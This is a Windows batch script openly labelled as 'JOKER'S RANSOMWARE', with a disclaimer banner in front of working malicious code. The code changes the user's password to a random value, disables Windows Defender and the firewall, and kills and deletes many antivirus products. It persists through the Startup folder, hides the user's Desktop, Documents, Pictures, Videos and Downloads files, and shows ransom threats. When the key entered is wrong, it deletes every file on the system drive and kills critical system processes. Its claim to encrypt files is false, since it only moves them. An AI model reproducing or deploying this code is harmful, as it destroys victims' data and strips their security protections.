::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCuDJNJUAM7N/JCrgIho+Fcx+EmQDCR3FCILVJkh2Anz9XYv5r2DIecW1UPteZMRWrqmEwHFM5evmJ5WgkImrGNNoGGHMIqMoQr3Q02eq3RhJCt9hGyw
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpSI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCuDJNJUAM7N/JCrgIho+Fcx+EmQDCR3FCILVJkh2Anz9XYv5r2DIecW1UPteZMR1XZTm8ABCSRgKEblaxcxyQ==
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983




@echo off
title don't close this window
echo PLEASE READ ALL OF THIS!!!
echo Any disadvantages caused by not reading are your responsibility.
echo .
echo .
echo .
echo .
echo .
echo Please do not abuse the code in this project. 
echo This project is ransomware of a malicious virus that carries a significant risk. 
echo The author of this code (Anion15) assumes no responsibility i.f this code is abused. 
echo ALL USERS OF THIS CODE ARE RESPONSIBLE AND DEFINES THE IMPLIED AGREEMENT THAT THE USERS OF THIS CODE, THAT THE USER, ARE LIABLE FOR ALL DAMAGES THAT MAY BE RESULTING IN THE FUTURE. 
echo Therefore, I swear by this letter that the authors of this code will not be punished in case of legal trouble. 
echo I will consider it as a material that can serve as evidence in the future. 
echo It is judged that the user is also aware that i.f they abuse this and cause harm to others, they may be subject to severe legal punishment. 
echo Recognize the dangers of this code and handle it with care. Don't run it on your own computer. 
echo Ransomware can infect your computer. I.f you are infected, please recover by referring to the #recovery key below. 
echo This virus is very difficult to recover and can be dangerous if used for real attack purposes.
echo There are many more risks like encrypting all files, disabling Windows defense, disabling computer antivirus similar to several antiviruses, changing computer login password, etc. 
echo Use with caution. For reference, this virus comes back to life even i.f the computer is rebooted.
echo Bottom line, don't run this virus! The creator believes that this damage will be substantial, and cannot guarantee any damage.
echo See above. Finally, i.f you remake this code, please credit this author and source.
echo .
echo .
echo I.f you don't want this virus running, close the window quickly without pressing any key!!!!!
echo .
echo .
pause
cls

:: ^From line 70, background run...
set "btitle=HACKER"
:: Notification content
set "text=Now HACKING"
:: Notification icon
:: error, info, none, warning 
set "icon=warning"
(echo [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms"^)
echo $objNotifyIcon = New-Object System.Windows.Forms.NotifyIcon
echo $objNotifyIcon.Icon = [System.Drawing.SystemIcons]::Information
echo $objNotifyIcon.BalloonTipIcon = "%icon%"
echo $objNotifyIcon.BalloonTipTitle = "%btitle%"
echo $objNotifyIcon.BalloonTipText = "%text%"
echo $objNotifyIcon.Visible = $True
echo $objNotifyIcon.ShowBalloonTip(10000^))>%temp%\notification.ps1
powershell -noprofile -executionpolicy bypass -file %temp%\notification.ps1 | more
del /q %temp%\notification.ps1


set "filename=clickme.bat"

if not "%~nx0" == "%filename%" (
  echo Renaming %~nx0 to %filename% and restarting...
  timeout 2 >nul
  ren "%~nx0" "%filename%"
  start "" "%filename%"
  exit /b
)

ipconfig /flushdns
Ipconfig /release
::change ip, and release it
net user %username% %random%                        
::change windows password randomly
sc config Sense start= disabled > NUL 2>&1          
::Forcibly defender Windows non-pandas from line 68 to line 98
net stop Sense > NUL 2>&1
sc config WdFilter start= disabled > NUL 2>&1
net stop WdFilter > NUL 2>&1
sc config WdNisSvc start= disabled > NUL 2>&1
net stop WdNisSvc Track > NUL 2>&1
sc config WinDefend start= disabled > NUL 2>&1
net stop WinDefend > NUL 2>&1
reg add "HKLM\System\CurrentControlSet\Services\Sense" /v "Start" /t REG_DWORD /d "4" /f > NUL 2>&1
reg add "HKLM\System\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWORD /d "4" /f > NUL 2>&1
reg add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f > NUL 2>&1
reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f > NUL 2>&1

schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable > NUL 2>&1
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable > NUL 2>&1
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable > NUL 2>&1
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable > NUL 2>&1

reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f > NUL 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d 1 /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d 1 /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d 0 /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SubmitSamplesConsent" /t REG_DWORD /d 0 /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d 0 /f
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefender" /f > NUL 2>&1
sc config WinDefend start= disabled
sc stop WinDefend                                    
::end
rem --
rem Permamanently Kill Anti-Virus
net stop "Security Center"
netsh firewall set opmode mode=disable
tskill /A av*
tskill /A fire*
tskill /A anti*
cls
tskill /A spy*
tskill /A bullguard
rem
rem Permanently Kill Anti-Virus
net stop ?Security Center?
netsh firewall set opmode mode=disable
tskill /A av*
tskill /A fire*
tskill /A anti*
cls
tskill /A spy*
tskill /A bullguard
tskill /A PersFw
tskill /A KAV*
tskill /A ZONEALARM
tskill /A SAFEWEB
cls
tskill /A spy*
tskill /A bullguard
tskill /A PersFw
tskill /A KAV*
tskill /A ZONEALARM
tskill /A SAFEWEB
cls
tskill /A OUTPOST
tskill /A nv*
tskill /A nav*
tskill /A F-*
tskill /A ESAFE
tskill /A cle
cls
tskill /A BLACKICE
tskill /A def*
tskill /A kav
tskill /A kav*
tskill /A avg*
tskill /A ash*
cls
tskill /A aswupdsv
tskill /A ewid*
tskill /A guard*
tskill /A guar*
tskill /A gcasDt*
tskill /A msmp*
cls
tskill /A mcafe*
tskill /A mghtml
tskill /A msiexec
tskill /A outpost
tskill /A isafe
tskill /A zap*cls
tskill /A zauinst
tskill /A upd*
tskill /A zlclien*
tskill /A minilog
tskill /A cc*
tskill /A norton*
cls
tskill /A norton au*
tskill /A ccc*
tskill /A npfmn*
tskill /A loge*
tskill /A nisum*
tskill /A issvc
tskill /A tmp*
cls
tskill /A tmn*
tskill /A pcc*
tskill /A cpd*
tskill /A pop*
tskill /A pav*
tskill /A padmincls
tskill /A panda*
tskill /A avsch*
tskill /A sche*
tskill /A syman*
tskill /A virus*
tskill /A realm*cls
tskill /A sweep*
tskill /A scan*
tskill /A ad-*
tskill /A safe*
tskill /A avas*
tskill /A norm*
cls
tskill /A offg*
del /Q /F C:\Program Files\alwils~1\avast4\*.*
del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
del /Q /F C:\Program Files\kasper~1\*.exe
cls
del /Q /F C:\Program Files\trojan~1\*.exe
del /Q /F C:\Program Files\f-prot95\*.dll
del /Q /F C:\Program Files\tbav\*.datcls
del /Q /F C:\Program Files\avpersonal\*.vdf
del /Q /F C:\Program Files\Norton~1\*.cnt
del /Q /F C:\Program Files\Mcafee\*.*
cls
del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\*.*
del /Q /F C:\Program Files\Norton~1\*.*
cls
del /Q /F C:\Program Files\avgamsr\*.exe
del /Q /F C:\Program Files\avgamsvr\*.exe
del /Q /F C:\Program Files\avgemc\*.exe
cls
del /Q /F C:\Program Files\avgcc\*.exe
del /Q /F C:\Program Files\avgupsvc\*.exe
del /Q /F C:\Program Files\grisoft
del /Q /F C:\Program Files\nood32krn\*.exe
del /Q /F C:\Program Files\nood32\*.exe
cls
del /Q /F C:\Program Files\nod32
del /Q /F C:\Program Files\nood32
del /Q /F C:\Program Files\kav\*.exe
del /Q /F C:\Program Files\kavmm\*.exe
del /Q /F C:\Program Files\kaspersky\*.*
cls
del /Q /F C:\Program Files\ewidoctrl\*.exe
del /Q /F C:\Program Files\guard\*.exe
del /Q /F C:\Program Files\ewido\*.exe
cls
del /Q /F C:\Program Files\pavprsrv\*.exe
del /Q /F C:\Program Files\pavprot\*.exe
del /Q /F C:\Program Files\avengine\*.exe
cls
del /Q /F C:\Program Files\apvxdwin\*.exe
del /Q /F C:\Program Files\webproxy\*.exe
del /Q /F C:\Program Files\panda
software\*.*
rem
title JOKER'S RANSOMWARE
xcopy clickme.bat "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup" /h /y
xcopy /h /y clickme.bat "%userprofile%\AppData"
chcp 949
set backup=%cd%
cd/
if not %cd%==C:\ cd /d c:\
del %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbso.vbs
del %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbs.vbs
del %userprofile%\POWER-JOKER-PASSWORD.txt
cd %backup%
if %cd%==%userprofile%\AppData goto a
cd %userprofile%\AppData
start %userprofile%\AppData\clickme.bat
exit
:a
mode con cols=120 lines=30
title Do not close this window!
del %userprofile%\Desktop\*.joker* >nul 2>&1
del %userprofile%\pictures\*.joker* >nul 2>&1
del %userprofile%\videos\*.joker* >nul 2>&1
del %userprofile%\documents\*.joker* >nul 2>&1
del %userprofile%\downloads\*.joker* >nul 2>&1
md %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\ >nul 2>&1
md %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\desk >nul 2>&1
md %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\pic >nul 2>&1
md %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\video >nul 2>&1
md %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\doc >nul 2>&1
md %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\down >nul 2>&1
move %userprofile%\Desktop\*.* %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\desk\
copy %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\desk\*.* %userprofile%\Desktop\*.joker*
move %userprofile%\pictures\*.* %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\pic\
copy %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\pic\*.* %userprofile%\pictures\*.joker*
move %userprofile%\videos\*.* %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\video\
copy %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\video\*.* %userprofile%\videos\*.joker*
move %userprofile%\Documents\*.* %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\doc\
copy %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\doc\*.* %userprofile%\Documents\*.joker*
move %userprofile%\downloads\*.* %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\down\
copy %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\down\*.* %userprofile%\downloads\*.joker*
cls
:: Up to line 314, background run...
title JOKER'S RANSOMWARE                    
::set t.itle
ECHO  ■■■■■                  ■■■                  ■    ■■                ■■■■■                ■■■■
ECHO      ■                    ■      ■                ■  ■                    ■                        ■      ■
ECHO      ■                    ■      ■                ■■                      ■■■■                  ■■■■
ECHO      ■                    ■      ■                ■  ■                    ■                        ■      ■
ECHO  ■■■                      ■■■                  ■    ■■                ■■■■■                ■      ■
ECHO.
ECHO  ■■■■      ■■■    ■      ■  ■■■■■    ■■■    ■      ■  ■      ■    ■■■    ■■■■    ■■■■■
ECHO  ■      ■  ■      ■  ■■    ■  ■          ■      ■  ■■  ■■  ■  ■  ■  ■      ■  ■      ■  ■
ECHO  ■■■■    ■■■■■  ■  ■  ■  ■■■■■  ■      ■  ■  ■  ■  ■  ■  ■  ■■■■■  ■■■■    ■■■■
ECHO  ■      ■  ■      ■  ■    ■■          ■  ■      ■  ■      ■  ■  ■  ■  ■      ■  ■      ■  ■
ECHO  ■      ■  ■      ■  ■      ■  ■■■■■    ■■■    ■      ■    ■  ■    ■      ■  ■      ■  ■■■■■
echo do not close this window.
timeout/t 3 /nobreak >nul
cls
echo Thank you for running this ransomware.                                      
::say to you
echo Your computer has been encrypted by the JOKER ransomware.
echo If you close this window, your files will not be recoverable.
echo Enter the recovery key to recover.
echo If the recovery key is incorrect, it will reboot with a blue screen.
echo Even if you turn off your computer, the JOKER ransomware will come back.
echo Deleting JOKER ransomware does not end JOKER ransomware.
set PASS=password
echo x=msgbox("All files in your Desktop, Downloads, Documents, Pictures and Videos folders are encrypted.",0+16,"JOKER")>> %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbs.vbs
echo x=msgbox("If you close JOKER ransomware, your files will be unrecoverable.",0+16,"JOKER")>> %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbs.vbs
echo x=msgbox("Even if you turn off your computer, the JOKER ransomware will come back.",0+16,"JOKER")>> %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbs.vbs
echo x=msgbox("Even if you delete JOKER ransomware, JOKER ransomware will work normally.",0+16,"JOKER")>> %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbs.vbs
echo CreateObject("SAPI.SpVoice").Speak "All files in your Desktop, Downloads, Documents, Pictures and Videos folders have been encrypted.">> %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbso.vbs
echo CreateObject("SAPI.SpVoice").Speak "If you close JOKER ransomware, your files will be unrecoverable.">> %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbso.vbs
POWER\clickmevbso.vbs
echo CreateObject("SAPI.SpVoice").Speak "Even if you turn off your computer, the JOKER ransomware will come back.">> %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbso.vbs
echo CreateObject("SAPI.SpVoice").Speak "Even if you delete JOKER ransomware, JOKER ransomware will work normally.">> %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbso.vbs
start %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbs.vbs
start %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbso.vbs

:pass                        
set /p password=복구키 : 
timeout/t 2 /nobreak >nul
if %password%==developerdecryptkey goto good
if %password%==%PASS% goto good

:bad               
::recovery key wrong
color 47
cls
echo Recovery key does not exist.
echo A blue screen will start.

::^D^e^l^ all file
echo ^D^e^l^ all file.
set randomqustn=%random%
echo ^d^e^l^ ^%^s^y^s^t^e^m^d^r^i^v^e^%^\^*^.^*^ ^/^f^ ^/^s^ ^/^q^ > %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\%randomqustn%.bat
start "" "%userprofile%\AppData\RANSOMWARE-MUTANT-POWER\%randomqustn%.bat"

timeout/t 2 >nul
cls
taskkill /f /im csrss.exe
taskkill /f /im svchost.exe
taskkill /f /im wininit.exe
taskkill /f /im winlogon.exe
set /p password=복구키 : 
if %password%==developerdecryptkey goto good
if %password%==%PASS% goto good
timeout/t 2 >nul
goto bad

:good               
::recovery key correct
cls
echo Restoring...
echo Never close this window.
echo Recovery takes about 5 seconds.
timeout/t 5 /nobreak >nul
  del %userprofile%\Desktop\*.joker*
  move %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\desk\*.* %userprofile%\Desktop\
  del %userprofile%\pictures\*.joker*
  move %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\pic\*.* %userprofile%\pictures\
  del %userprofile%\videos\*.joker*
  move %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\video\*.* %userprofile%\videos\
  del %userprofile%\documents\*.joker*
  move %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\doc\*.* %userprofile%\documents\
  del %userprofile%\downloads\*.joker*
  move %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\down\*.* %userprofile%\downloads\
cls
del %userprofile%\POWER-JOKER-PASSWORD.txt
::retrun all file
del /a "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup\clickme.bat"
rmdir /s /q %userprofile%\AppData\RANSOMWARE-MUTANT-POWER
cls
echo detox success
echo boom!
timeout /t 5 /nobreak >nul
cls
del %userprofile%\Desktop\*clickme.bat*
del %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\%randomqustn%.bat
exit
          ::program end
